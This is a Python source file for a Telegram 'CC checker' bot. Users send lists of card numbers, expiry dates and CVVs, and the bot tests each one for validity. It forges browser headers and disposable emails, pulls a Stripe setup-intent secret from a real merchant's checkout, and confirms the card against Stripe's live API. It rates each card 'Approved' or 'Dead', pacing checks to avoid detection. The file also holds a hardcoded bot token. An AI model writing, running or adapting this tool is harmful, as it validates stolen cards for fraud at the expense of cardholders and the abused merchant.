import re
import time
import threading
import random
import string
import requests
import telebot

BOT_TOKEN = '7621706011:AAE8N5F-uz1CNQ2T4QrXqKP7sTxuSeM-YgE'
bot = telebot.TeleBot(BOT_TOKEN)

user_stop_flag = {}
processing_status = {}

def random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{username}@gmail.com"

def parse_cards(text):
    cards = []
    lines = text.replace('/', '|').splitlines()
    for line in lines:
        parts = [p.strip().replace(' ', '') for p in line.split('|')]
        if len(parts) == 4:
            cc, mm, yy, cvv = parts
            if len(yy) == 2:
                yy = '20' + yy
            if all(p.isdigit() for p in [cc, mm, yy, cvv]):
                cards.append((cc, mm, yy, cvv))
    return cards

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(
        message.chat.id,
        "🔒 Movement.so CC Checker Bot\n\n"
        "Send credit cards in one of these formats (one per line):\n"
        "`CC|MM|YY|CVV`\n"
        "`CC|MM|YYYY|CVV`\n"
        "`CC/MM/YY/CVV`\n"
        "`CC/MM/YYYY/CVV`\n\n"
        "⏳ 15s delay between checks\n"
        "⏹ Use /stop to cancel processing",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['stop'])
def stop_handler(message):
    user_stop_flag[message.from_user.id] = True
    bot.send_message(message.chat.id, "⏹ Processing stopped")

def check_card_flow(message, cards):
    user_id = message.from_user.id
    chat_id = message.chat.id
    user_stop_flag[user_id] = False

    for idx, (cc, mm, yy, cvv) in enumerate(cards, 1):
        if user_stop_flag.get(user_id):
            bot.send_message(chat_id, "⏹️ Checking stopped by user.")
            break

        email = random_email()
        device_id = ''.join(random.choices(string.hexdigits, k=32))
        session_id = str(int(time.time() * 1000))
        try:
            # Step 1: Verify subscriber (get authentication_token)
            verify_headers = {
                "accept": "application/json",
                "content-type": "application/json",
                "origin": "https://aroshanti.mvt.so",
                "referer": "https://aroshanti.mvt.so/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                "x-account-app": "aroshanti",
                "x-client-height": "500",
                "x-client-width": "584",
                "x-device-id": device_id,
                "x-native-app": "false",
                "x-origin-href": "https://aroshanti.mvt.so/buy/10825#checkout/pay",
                "x-session-id": session_id,
                "x-standalone": "false",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "priority": "u=1, i",
                "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
            }
            verify_data = {"email": email, "name": None}
            verify_resp = requests.post(
                "https://api.movement.so/auth/verify_subscriber",
                headers=verify_headers,
                json=verify_data,
                timeout=30
            )
            verify_json = verify_resp.json()
            authentication_token = verify_json.get("authentication_token")
            if not authentication_token:
                raise Exception(f"Failed to get authentication_token: {verify_resp.text}")

            # Step 2: Get clientSecret (intent)
            intent_headers = {
                "accept": "application/json",
                "content-type": "application/json",
                "origin": "https://aroshanti.mvt.so",
                "referer": "https://aroshanti.mvt.so/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                "x-account-app": "aroshanti",
                "x-client-height": "500",
                "x-client-width": "584",
                "x-device-id": device_id,
                "x-native-app": "false",
                "x-origin-href": "https://aroshanti.mvt.so/buy/10825#checkout/pay",
                "x-session-id": session_id,
                "x-standalone": "false",
                "x-user-email": email,
                "x-user-token": authentication_token,
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "priority": "u=1, i",
                "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
            }
            intent_data = {
                "version_id": 25148,
                "coupon": "",
                "referral": {},
                "order_bumps": [],
                "address": {},
                "name": None,
                "final_amount": 0
            }
            intent_resp = requests.post(
                "https://api.movement.so/products/10825/intent",
                headers=intent_headers,
                json=intent_data,
                timeout=30
            )
            intent_json = intent_resp.json()
            client_secret = intent_json.get("clientSecret")
            if not client_secret:
                raise Exception(f"Failed to get clientSecret: {intent_resp.text}")

            # Extract setup_intent id from client_secret
            # Example: seti_1RNvJiFzisrn5JQa2mpz9CkN_secret_xxx -> seti_1RNvJiFzisrn5JQa2mpz9CkN
            match = re.match(r"(seti_[^_]+)", client_secret)
            if not match:
                raise Exception(f"Could not parse setup_intent id from clientSecret: {client_secret}")
            setup_intent_id = match.group(1)

            # Step 3: Stripe confirm (card check)
            # Prepare post data as x-www-form-urlencoded
            stripe_url = f"https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm"
            post_data = {
                "return_url": "https://aroshanti.mvt.so/buy/10825?product_id=10825&guest=true#checkout/callback",
                "payment_method_data[type]": "card",
                "payment_method_data[card][number]": cc,
                "payment_method_data[card][cvc]": cvv,
                "payment_method_data[card][exp_year]": yy[-2:],
                "payment_method_data[card][exp_month]": mm,
                "payment_method_data[allow_redisplay]": "unspecified",
                "payment_method_data[billing_details][address][country]": "IQ",
                "payment_method_data[payment_user_agent]": "stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; payment-element; deferred-intent; autopm",
                "payment_method_data[referrer]": "https://aroshanti.mvt.so",
                "payment_method_data[time_on_page]": str(random.randint(10000, 99999)),
                "payment_method_data[client_attribution_metadata][client_session_id]": device_id,
                "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
                "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
                "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
                "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
                "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
                "payment_method_data[guid]": device_id,
                "payment_method_data[muid]": device_id[:32],
                "payment_method_data[sid]": device_id[-32:],
                "expected_payment_method_type": "card",
                "client_context[currency]": "gbp",
                "client_context[mode]": "setup",
                "client_context[setup_future_usage]": "off_session",
                "key": "pk_live_TkKfklEHyCsuwMAtIqVRg7dd",
                "client_secret": client_secret,
            }
            # radar_options[hcaptcha_token] is omitted here, as you did not provide a valid token

            stripe_headers = {
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
                "accept": "application/json",
            }
            stripe_resp = requests.post(
                stripe_url,
                headers=stripe_headers,
                data=post_data,
                timeout=30
            )
            stripe_text = stripe_resp.text

            if "succeeded" in stripe_text:
                status = "✅ Approved"
            else:
                status = "❌ Dead"

            bot.send_message(
                chat_id,
                f"Card #{idx}\n"
                f"Number: {cc}|{mm}|{yy}|{cvv}\n"
                f"Email: {email}\n"
                f"Status: {status}\n"
                f"Response:\n<code>{stripe_text}</code>",
                parse_mode="HTML"
            )

        except Exception as e:
            bot.send_message(
                chat_id,
                f"❌ Error processing card #{idx}\n"
                f"{cc}|{mm}|{yy}|{cvv}\n"
                f"Error: {str(e)}"
            )

        if idx < len(cards):
            for i in range(15, 0, -1):
                if user_stop_flag.get(user_id):
                    return
                bot.send_chat_action(chat_id, 'typing')
                time.sleep(1)

@bot.message_handler(func=lambda m: True)
def card_handler(message):
    user_id = message.from_user.id
    if processing_status.get(user_id):
        bot.send_message(message.chat.id, "⚠️ Already processing cards, please wait")
        return

    cards = parse_cards(message.text)
    if not cards:
        bot.send_message(
            message.chat.id,
            "❌ Invalid format. Please send cards as:\n"
            "CC|MM|YY|CVV\nCC|MM|YYYY|CVV\n"
            "CC/MM/YY/CVV\nCC/MM/YYYY/CVV"
        )
        return

    processing_status[user_id] = True
    bot.send_message(message.chat.id, f"🔍 Processing {len(cards)} cards...")

    def process_wrapper():
        check_card_flow(message, cards)
        processing_status[user_id] = False

    threading.Thread(target=process_wrapper).start()

if __name__ == '__main__':
    processing_status = {}
    bot.infinity_polling()
